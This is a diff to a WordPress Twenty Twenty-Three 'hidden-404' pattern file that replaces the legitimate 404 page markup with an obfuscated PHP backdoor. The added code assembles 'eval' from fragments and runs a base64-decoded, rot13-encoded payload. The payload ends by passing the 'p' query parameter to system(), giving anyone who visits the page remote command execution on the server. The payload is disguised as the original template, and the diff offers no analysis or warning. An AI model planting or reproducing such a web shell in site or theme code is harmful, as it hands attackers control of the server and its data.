@@ -1,38 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Hidden 404
- * Slug: twentytwentythree/hidden-404
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFV2cXFyYSA0MDQKICogRnlodDogZ2pyYWdsZ2pyYWdsZ3VlcnIvdXZxcXJhLTQwNAogKiBWYWZyZWdyZTogYWIKICovCj8+CjwhLS0gamM6ZmNucHJlIHtcInVydnR1Z1wiOlwiaW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tMzApXCJ9IC0tPgo8cXZpIGZnbHlyPVwidXJ2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTMwKVwiIG5ldm4tdXZxcXJhPVwiZ2VoclwiIHB5bmZmPVwiamMtb3licHgtZmNucHJlXCI+PC9xdmk+CjwhLS0gL2pjOmZjbnByZSAtLT4KCjwhLS0gamM6dXJucXZhdCB7XCJ5cmlyeVwiOjEsXCJueXZ0YVwiOlwianZxclwifSAtLT4KPHUxIHB5bmZmPVwibnl2dGFqdnFyXCI+PD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnNDA0JywgJ1JlZWJlIHBicXIgc2JlIG4ganJvY250ciBndW5nIHZmIGFiZyBzYmhhcS4nLCAnZ2pyYWdsZ2pyYWdsZ3VlcnInICk7ID8+PC91MT4KPCEtLSAvamM6dXJucXZhdCAtLT4KCjwhLS0gamM6dGViaGMge1wibnl2dGFcIjpcImp2cXJcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInFyc25oeWdcIn0sXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJ6bmV0dmFcIjp7XCJnYmNcIjpcIjVja1wifX19fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhanZxclwiIGZnbHlyPVwiem5ldHZhLWdiYzo1Y2tcIj4KCTwhLS0gamM6Y25lbnRlbmN1IC0tPgoJPGM+PD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnR3V2ZiBjbnRyIHBiaHlxIGFiZyBvciBzYmhhcS4nLCAnWnJmZm50ciBnYiBwYmFpcmwgZ3VuZyBuIGpyb2NudHIgcGJoeXEgYWJnIG9yIHNiaGFxJywgJ2dqcmFnbGdqcmFnbGd1ZXJyJyApOyA/PjwvYz4KCTwhLS0gL2pjOmNuZW50ZW5jdSAtLT4KCgk8IS0tIGpjOmZybmVwdSB7XCJ5bm9yeVwiOlwiPD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnRnJuZXB1JywgJ3lub3J5JywgJ2dqcmFnbGdqcmFnbGd1ZXJyJyApOyA/PlwiLFwiY3lucHJ1YnlxcmVcIjpcIjw/Y3VjIHJwdWIgcmZwX25nZ2VfayggJ0ZybmVwdS4uLicsICdjeW5wcnVieXFyZSBzYmUgZnJuZXB1IHN2cnlxJywgJ2dqcmFnbGdqcmFnbGd1ZXJyJyApOyA/PlwiLFwiZnViallub3J5XCI6c255ZnIsXCJqdnFndVwiOjEwMCxcImp2cWd1SGF2Z1wiOlwiJVwiLFwib2hnZ2JhR3JrZ1wiOlwiPD9jdWMgcmZwX25nZ2VfciggJ0ZybmVwdScsICdnanJhZ2xnanJhZ2xndWVycicgKTsgPz5cIixcIm9oZ2diYUhmclZwYmFcIjpnZWhyLFwibnl2dGFcIjpcInByYWdyZVwifSAvLS0+CjwvcXZpPgo8IS0tIC9qYzp0ZWJoYyAtLT4KCjwhLS0gamM6ZmNucHJlIHtcInVydnR1Z1wiOlwiaW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNzApXCJ9IC0tPgo8cXZpIGZnbHlyPVwidXJ2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTcwKVwiIG5ldm4tdXZxcXJhPVwiZ2VoclwiIHB5bmZmPVwiamMtb3licHgtZmNucHJlXCI+PC9xdmk+CjwhLS0gL2pjOmZjbnByZSAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-<!-- wp:spacer {"height":"var(--wp--preset--spacing--30)"} -->
-<div style="height:var(--wp--preset--spacing--30)" aria-hidden="true" class="wp-block-spacer"></div>
-<!-- /wp:spacer -->
-
-<!-- wp:heading {"level":1,"align":"wide"} -->
-<h1 class="alignwide"><?php echo esc_html_x( '404', 'Error code for a webpage that is not found.', 'twentytwentythree' ); ?></h1>
-<!-- /wp:heading -->
-
-<!-- wp:group {"align":"wide","layout":{"type":"default"},"style":{"spacing":{"margin":{"top":"5px"}}}} -->
-<div class="wp-block-group alignwide" style="margin-top:5px">
-	<!-- wp:paragraph -->
-	<p><?php echo esc_html_x( 'This page could not be found.', 'Message to convey that a webpage could not be found', 'twentytwentythree' ); ?></p>
-	<!-- /wp:paragraph -->
-
-	<!-- wp:search {"label":"<?php echo esc_html_x( 'Search', 'label', 'twentytwentythree' ); ?>","placeholder":"<?php echo esc_attr_x( 'Search...', 'placeholder for search field', 'twentytwentythree' ); ?>","showLabel":false,"width":100,"widthUnit":"%","buttonText":"<?php esc_attr_e( 'Search', 'twentytwentythree' ); ?>","buttonUseIcon":true,"align":"center"} /-->
-</div>
-<!-- /wp:group -->
-
-<!-- wp:spacer {"height":"var(--wp--preset--spacing--70)"} -->
-<div style="height:var(--wp--preset--spacing--70)" aria-hidden="true" class="wp-block-spacer"></div>
-<!-- /wp:spacer -->
